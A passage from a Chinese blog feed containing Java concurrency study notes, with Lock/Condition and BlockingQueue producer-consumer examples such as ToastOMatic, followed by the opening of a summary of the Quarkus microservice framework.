"</span>);</span><br><span class="line">	        <span class="keyword">synchronized</span>(restaurant.waitPerson) &#123;</span><br><span class="line">	          restaurant.meal = <span class="keyword">new</span> Meal(count);</span><br><span class="line">	          restaurant.waitPerson.notifyAll();</span><br><span class="line">	        &#125;</span><br><span class="line">	        TimeUnit.MILLISECONDS.sleep(<span class="number">100</span>);</span><br><span class="line">	      &#125;</span><br><span class="line">	    &#125; <span class="keyword">catch</span>(InterruptedException e) &#123;</span><br><span class="line">	    	Print.print(<span class="string">"Chef interrupted"</span>);</span><br><span class="line">	    &#125;</span><br><span class="line">	  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>测试类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Restaurant</span> </span>&#123;</span><br><span class="line">	  Meal meal;</span><br><span class="line">	  ExecutorService exec = Executors.newCachedThreadPool();</span><br><span class="line">	  WaitPerson waitPerson = <span class="keyword">new</span> WaitPerson(<span class="keyword">this</span>);</span><br><span class="line">	  Chef chef = <span class="keyword">new</span> Chef(<span class="keyword">this</span>);</span><br><span class="line">	  <span class="function"><span class="keyword">public</span> <span class="title">Restaurant</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	    exec.execute(chef);</span><br><span class="line">	    exec.execute(waitPerson);</span><br><span class="line">	  &#125;</span><br><span class="line">	  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">	    <span class="keyword">new</span> Restaurant();</span><br><span class="line">	  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>执行结果：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Order up! Waitperson got Meal <span class="number">1</span></span><br><span class="line">Order up! Waitperson got Meal <span class="number">2</span></span><br><span class="line">Order up! Waitperson got Meal <span class="number">3</span></span><br><span class="line">Order up! Waitperson got Meal <span class="number">4</span></span><br><span class="line">Order up! Waitperson got Meal <span class="number">5</span></span><br><span class="line">Order up! Waitperson got Meal <span class="number">6</span></span><br><span class="line">Order up! Waitperson got Meal <span class="number">7</span></span><br><span class="line">Order up! Waitperson got Meal <span class="number">8</span></span><br><span class="line">Order up! Waitperson got Meal <span class="number">9</span></span><br><span class="line">Out of food, closing</span><br><span class="line">Order up! WaitPerson interrupted</span><br><span class="line">Chef interrupted</span><br></pre></td></tr></table></figure>
<p><strong>使用显示的 Lock 和 Condition 对象</strong></p>
<p>在 java SE5 的类库中还有额外的显示工具。我们来重写我们的打蜡和抛光类。使用互斥并允许任务挂起的基本类是 Condition，你可以通过在 Condition 上调用 await() 来挂起一个任务。当外部条件发生变化时，意味着某个任务应该继续执行，你可以通过调用 signal() 来通知这个任务，从而唤醒一个任务，或者调用 signalAll() 来唤醒所有在这个 Condition 上被挂起的任务。(signalAll() 比 notifAll() 是更安全的方式)</p>
<p>下面是重写版本：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> Lock lock = <span class="keyword">new</span> ReentrantLock();</span><br><span class="line">  <span class="keyword">private</span> Condition condition = lock.newCondition();</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">boolean</span> waxOn = <span class="keyword">false</span>;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">waxed</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    lock.lock();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      waxOn = <span class="keyword">true</span>; <span class="comment">// Ready to buff</span></span><br><span class="line">      condition.signalAll();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">      lock.unlock();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">buffed</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    lock.lock();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      waxOn = <span class="keyword">false</span>; <span class="comment">// Ready for another coat of wax</span></span><br><span class="line">      condition.signalAll();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">      lock.unlock();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">waitForWaxing</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">    lock.lock();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">while</span>(waxOn == <span class="keyword">false</span>)</span><br><span class="line">        condition.await();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">      lock.unlock();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">waitForBuffing</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException</span>&#123;</span><br><span class="line">    lock.lock();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">while</span>(waxOn == <span class="keyword">true</span>)</span><br><span class="line">        condition.await();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">      lock.unlock();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WaxOn</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> Car car;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">WaxOn</span><span class="params">(Car c)</span> </span>&#123; car = c; &#125;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">while</span>(!Thread.interrupted()) &#123;</span><br><span class="line">        printnb(<span class="string">"Wax On! "</span>);</span><br><span class="line">        TimeUnit.MILLISECONDS.sleep(<span class="number">200</span>);</span><br><span class="line">        car.waxed();</span><br><span class="line">        car.waitForBuffing();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(InterruptedException e) &#123;</span><br><span class="line">      print(<span class="string">"Exiting via interrupt"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    print(<span class="string">"Ending Wax On task"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WaxOff</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> Car car;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">WaxOff</span><span class="params">(Car c)</span> </span>&#123; car = c; &#125;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">while</span>(!Thread.interrupted()) &#123;</span><br><span class="line">        car.waitForWaxing();</span><br><span class="line">        printnb(<span class="string">"Wax Off! "</span>);</span><br><span class="line">        TimeUnit.MILLISECONDS.sleep(<span class="number">200</span>);</span><br><span class="line">        car.buffed();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(InterruptedException e) &#123;</span><br><span class="line">      print(<span class="string">"Exiting via interrupt"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    print(<span class="string">"Ending Wax Off task"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WaxOMatic2</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    Car car = <span class="keyword">new</span> Car();</span><br><span class="line">    ExecutorService exec = Executors.newCachedThreadPool();</span><br><span class="line">    exec.execute(<span class="keyword">new</span> WaxOff(car));</span><br><span class="line">    exec.execute(<span class="keyword">new</span> WaxOn(car));</span><br><span class="line">    TimeUnit.SECONDS.sleep(<span class="number">5</span>);</span><br><span class="line">    exec.shutdownNow();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在 Car 的构造器中单个的 Lock 将产生一个 Condition 对象，这个对象被用来管理任务之间的通信。但是这个 Condition 不包含任何有关处理状态的信息，因此你需要额外的表示处理状态的信息，即 Boolean waxOn。</p>
<h3 id="生产者消费者与队列"><a href="#生产者消费者与队列" class="headerlink" title="生产者消费者与队列"></a>生产者消费者与队列</h3><p>wait() 和 notifAll() 方法以一种非常低级的方式解决了任务的互操作的问题，即每次交互时都握手。许多时候我们可以使用同步队列来解决协作的问题，同步队列在任何时刻只允许一个任务插入或移除元素。在 Java.util.concurrent.BlockingQueue 接口中提供了这个队列，这个接口有大量的标准实现。可以使用 LinkedBlockingQueue 他是一个无界队列，还可以使用 ArrayBlockingQueue，它具有固定的尺寸，可以在它被阻塞之前向其中放置有限数量的元素。</p>
<p>如果消费者任务试图从队列中获取对象，而该队列为空时，那么这些队列就可以挂起这些任务，并且当有更多的元素可用时恢复这些消费任务。阻塞队列可以解决非常大的问题，而其方式与 wait() 和 notifyAll() 相比，则简单切可靠。</p>
<p>下面是一个简单的测试，它将多个 LiftOff 对象执行串行化。消费者 LiftOffRunner 将每个 LiftOff 对象从 BlockIngQueue 中推出并直接运行。它通过显示的调用 run() 而是用自己的线程来运行，而不是为每个任务启动一个线程。</p>
<p>首先把之前写过的 LiftOff 类贴出来：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LiftOff</span> <span class="keyword">implements</span> <span class="title">Runnable</span></span>&#123;</span><br><span class="line">	  <span class="keyword">protected</span> <span class="keyword">int</span> countDown = <span class="number">10</span>; <span class="comment">// Default</span></span><br><span class="line">	  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> taskCount = <span class="number">0</span>;</span><br><span class="line">	  <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span> id = taskCount++;</span><br><span class="line">	  <span class="function"><span class="keyword">public</span> <span class="title">LiftOff</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">	  <span class="function"><span class="keyword">public</span> <span class="title">LiftOff</span><span class="params">(<span class="keyword">int</span> countDown)</span> </span>&#123;</span><br><span class="line">	    <span class="keyword">this</span>.countDown = countDown;</span><br><span class="line">	  &#125;</span><br><span class="line">	  <span class="function"><span class="keyword">public</span> String <span class="title">status</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	    <span class="keyword">return</span> <span class="string">"#"</span> + id + <span class="string">"("</span> +</span><br><span class="line">	      (countDown &gt; <span class="number">0</span> ? countDown : <span class="string">"Liftoff!"</span>) + <span class="string">"), "</span>;</span><br><span class="line">	  &#125;</span><br><span class="line">	  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	    <span class="keyword">while</span>(countDown-- &gt; <span class="number">0</span>) &#123;</span><br><span class="line">	      System.out.print(status());</span><br><span class="line">	      Thread.yield();</span><br><span class="line">	    &#125;</span><br><span class="line">	  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>LiftOffRunner 类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LiftOffRunner</span> <span class="keyword">implements</span> <span class="title">Runnable</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> BlockingQueue&lt;LiftOff&gt; rockets;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="title">LiftOffRunner</span><span class="params">(BlockingQueue&lt;LiftOff&gt; rockets)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">super</span>();</span><br><span class="line">		<span class="keyword">this</span>.rockets = rockets;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(LiftOff lo)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			rockets.put(lo);</span><br><span class="line">		&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">			<span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">			System.out.println(<span class="string">"添加失败"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			<span class="keyword">while</span> (!Thread.interrupted()) &#123;</span><br><span class="line">				LiftOff rocket = rockets.take();</span><br><span class="line">				rocket.run();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">			<span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">			System.out.println(<span class="string">"运行中断"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		System.out.println(<span class="string">"退出运行"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后是测试类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestBlockingQueues</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">getkey</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			<span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(System.in)).readLine();</span><br><span class="line">		&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">			<span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">getkey</span><span class="params">(String message)</span> </span>&#123;</span><br><span class="line">	    Print.print(message);</span><br><span class="line">	    getkey();</span><br><span class="line">	  &#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">(String msg,BlockingQueue&lt;LiftOff&gt; queue)</span></span>&#123;</span><br><span class="line">		LiftOffRunner runner = <span class="keyword">new</span> LiftOffRunner(queue);</span><br><span class="line">		Thread thread = <span class="keyword">new</span> Thread(runner);</span><br><span class="line">		thread.start();</span><br><span class="line">		<span class="comment">//启动了，但是内容是空的，就一直挂起，等待有新的内容进去</span></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">			runner.add(<span class="keyword">new</span> LiftOff(<span class="number">5</span>));</span><br><span class="line">		&#125;</span><br><span class="line">		getkey(<span class="string">"Press Enter "</span>+ msg);</span><br><span class="line">		thread.interrupt();</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		test(<span class="string">"LinkedBlockingQueue"</span>, <span class="keyword">new</span> LinkedBlockingQueue&lt;LiftOff&gt;());</span><br><span class="line">		test(<span class="string">"ArrayBlockingQueue"</span>, <span class="keyword">new</span> ArrayBlockingQueue&lt;&gt;(<span class="number">3</span>));</span><br><span class="line">		test(<span class="string">"SynchronousQueue"</span>, <span class="keyword">new</span> SynchronousQueue&lt;&gt;());</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>吐司 BlockingQueue</strong></p>
<p>下面是一个示例，每一台机器都有三个任务：一个只做吐司、一个给吐司抹黄油、另一个在涂抹黄油的吐司上抹果酱。我们来示例如果使用 BlockIngQueue 来运行这个示例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Toast</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">enum</span> Status &#123; DRY, BUTTERED, JAMMED &#125;</span><br><span class="line">  <span class="keyword">private</span> Status status = Status.DRY;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">int</span> id;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">Toast</span><span class="params">(<span class="keyword">int</span> idn)</span> </span>&#123; id = idn; &#125;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">butter</span><span class="params">()</span> </span>&#123; status = Status.BUTTERED; &#125;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">jam</span><span class="params">()</span> </span>&#123; status = Status.JAMMED; &#125;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> Status <span class="title">getStatus</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> status; &#125;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getId</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> id; &#125;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"Toast "</span> + id + <span class="string">": "</span> + status;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ToastQueue</span> <span class="keyword">extends</span> <span class="title">LinkedBlockingQueue</span>&lt;<span class="title">Toast</span>&gt; </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Toaster</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> ToastQueue toastQueue;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">private</span> Random rand = <span class="keyword">new</span> Random(<span class="number">47</span>);</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">Toaster</span><span class="params">(ToastQueue tq)</span> </span>&#123; toastQueue = tq; &#125;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">while</span>(!Thread.interrupted()) &#123;</span><br><span class="line">        TimeUnit.MILLISECONDS.sleep(</span><br><span class="line">          <span class="number">100</span> + rand.nextInt(<span class="number">500</span>));</span><br><span class="line">        <span class="comment">// Make toast</span></span><br><span class="line">        Toast t = <span class="keyword">new</span> Toast(count++);</span><br><span class="line">        print(t);</span><br><span class="line">        <span class="comment">// Insert into queue</span></span><br><span class="line">        toastQueue.put(t);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(InterruptedException e) &#123;</span><br><span class="line">      print(<span class="string">"Toaster interrupted"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    print(<span class="string">"Toaster off"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Apply butter to toast:</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Butterer</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> ToastQueue dryQueue, butteredQueue;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">Butterer</span><span class="params">(ToastQueue dry, ToastQueue buttered)</span> </span>&#123;</span><br><span class="line">    dryQueue = dry;</span><br><span class="line">    butteredQueue = buttered;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">while</span>(!Thread.interrupted()) &#123;</span><br><span class="line">        <span class="comment">// Blocks until next piece of toast is available:</span></span><br><span class="line">        Toast t = dryQueue.take();</span><br><span class="line">        t.butter();</span><br><span class="line">        print(t);</span><br><span class="line">        butteredQueue.put(t);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(InterruptedException e) &#123;</span><br><span class="line">      print(<span class="string">"Butterer interrupted"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    print(<span class="string">"Butterer off"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Apply jam to buttered toast:</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Jammer</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> ToastQueue butteredQueue, finishedQueue;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">Jammer</span><span class="params">(ToastQueue buttered, ToastQueue finished)</span> </span>&#123;</span><br><span class="line">    butteredQueue = buttered;</span><br><span class="line">    finishedQueue = finished;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">while</span>(!Thread.interrupted()) &#123;</span><br><span class="line">        <span class="comment">// Blocks until next piece of toast is available:</span></span><br><span class="line">        Toast t = butteredQueue.take();</span><br><span class="line">        t.jam();</span><br><span class="line">        print(t);</span><br><span class="line">        finishedQueue.put(t);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(InterruptedException e) &#123;</span><br><span class="line">      print(<span class="string">"Jammer interrupted"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    print(<span class="string">"Jammer off"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Consume the toast:</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Eater</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> ToastQueue finishedQueue;</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">int</span> counter = <span class="number">0</span>;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">Eater</span><span class="params">(ToastQueue finished)</span> </span>&#123;</span><br><span class="line">    finishedQueue = finished;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">while</span>(!Thread.interrupted()) &#123;</span><br><span class="line">        <span class="comment">// Blocks until next piece of toast is available:</span></span><br><span class="line">        Toast t = finishedQueue.take();</span><br><span class="line">        <span class="comment">// Verify that the toast is coming in order,</span></span><br><span class="line">        <span class="comment">// and that all pieces are getting jammed:</span></span><br><span class="line">        <span class="keyword">if</span>(t.getId() != counter++ ||</span><br><span class="line">           t.getStatus() != Toast.Status.JAMMED) &#123;</span><br><span class="line">          print(<span class="string">"&gt;&gt;&gt;&gt; Error: "</span> + t);</span><br><span class="line">          System.exit(<span class="number">1</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span></span><br><span class="line">          print(<span class="string">"Chomp! "</span> + t);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(InterruptedException e) &#123;</span><br><span class="line">      print(<span class="string">"Eater interrupted"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    print(<span class="string">"Eater off"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ToastOMatic</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    ToastQueue dryQueue = <span class="keyword">new</span> ToastQueue(),</span><br><span class="line">               butteredQueue = <span class="keyword">new</span> ToastQueue(),</span><br><span class="line">               finishedQueue = <span class="keyword">new</span> ToastQueue();</span><br><span class="line">    ExecutorService exec = Executors.newCachedThreadPool();</span><br><span class="line">    exec.execute(<span class="keyword">new</span> Toaster(dryQueue));</span><br><span class="line">    exec.execute(<span class="keyword">new</span> Butterer(dryQueue, butteredQueue));</span><br><span class="line">    exec.execute(<span class="keyword">new</span> Jammer(butteredQueue, finishedQueue));</span><br><span class="line">    exec.execute(<span class="keyword">new</span> Eater(finishedQueue));</span><br><span class="line">    TimeUnit.SECONDS.sleep(<span class="number">5</span>);</span><br><span class="line">    exec.shutdownNow();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个示例中没有任何显示的同步，因为同步队列和系统的设计隐式的管理了每片 Toast 在任何时刻都只有一个任务在操作。因为队列的阻塞，使得处理过程将被自动挂起和恢复。</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
  </entry>
  <entry>
    <title>Quarkus微服务框架</title>
    <url>/Java/Quarkus%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%A1%86%E6%9E%B6/</url>
    <content><![CDATA[<p><code>Quarkus</code> 是 <code>RedHat</code> 的一款轻量级的 <code>Java</code> 微服务框架 ( <code>MicroProfile</code> 规范 )。</p>
<p><code>Quarkus</code> 可以借助 <code>GraalVM</code> 编译成二进制文件，提供了优秀的容器化(<code>Kubernetes</code>)整合能力，相较于传统开发框架（<code>Spring Boot</code>）有着更快的启动速度、更小的内存消耗、更短的服务响应。</p>
<blockquote>
<p>Quarkus的标签：RedHat / JVM / GraalVM / Vert.x (Netty) / MicroProfile / No Servlet /启动快 /占用内存小 / 容器 / Kubernetes</p>
</blockquote>
<p>本文是阅读总结关键信息的笔记，更详细请阅读原文。<br><a href="https://www.infoq.cn/article/MBAYoWrjCOAJK5QuqbcQ" target="_blank" rel="noopener">【如何借助 Quarkus 和 MicroProfile 实现微服务】</a><br><a href="https://www.infoq.com/articles/microservicilities-quarkus/" target="_blank" rel="noopener">【英文原文：Implementing Microservicilities with Quarkus and MicroProfile】</a> </p>
<h3 id="Quarkus-实现-MicroProfile-规范微服务特性"><a href="#Quarkus-实现-MicroProfile-规范微服务特性" class="headerlink" title="Quarkus 实现 MicroProfile 规范微服务特性"></a>Quarkus 实现 MicroProfile 规范微服务特性</h3><p>MicroProfile 规范有些 API 是基于Jakarta EE（也就是以前的 Java EE）规范，其他的则由Java社区开发。<br>Quarkus 集成了 MicroProfile 规范，将企业级 Java 生态系统转移到了微服务架构中。</p>
<ul>
<li>API，Quarkus 使用大家熟知的 <code>JAX-RS</code> 规范来定义 <code>RESTful web API</code>。在底层，Quarkus 使用了 RESTEasy 实现，<strong>直接与 <code>Vert.X</code> 框架协作，而不是使用 <code>Servlet</code> 相关的技术</strong>。</li>
<li>调用，Quarkus 使用 <code>MicroProfile Rest Client</code> 规范来访问外部的（HTTP）服务。它提供了一种类型安全的方式借助 HTTP 协议访问 RESTful 服务，在这个过程中，它会使用 <code>JAX-RS 2.0</code> 的一些 API 以实现一致性和更简单的重用。</li>
<li>认证，Quarkus 集成了 <code>MicroProfile JWT RBAC Security</code> 规范，以使用 <code>JWT Bearer Token</code> 来保护服务。</li>
<li>容错性，Quarkus 将 <code>MicroProfile Fault Tolerance</code> 规范与如下的注解集成到了一起，以便于处理故障相关的问题</li>
<li>日志，Quarkus 使用 <code>Graylog</code> 扩展日志格式（<code>Graylog Extended Log Format，GELF</code>）与 <code>Fluentd</code> 进行了集成。</li>
<li>监控，Quarkus 集成了 <code>Micrometer</code> 实现应用监控。<code>Micrometer</code> 为几乎所有流行的监控系统提供了一个简单的入口，从而能够让我们在避免供应商锁定的前提下 <code>instrument</code> 基于 <code>JVM</code> 的应用。</li>
<li>跟踪，Quarkus 应用使用 <code>OpenTracing</code> 规范来为互相交互的 <code>Web</code> 应用提供分布式跟踪能力。</li>
</ul>
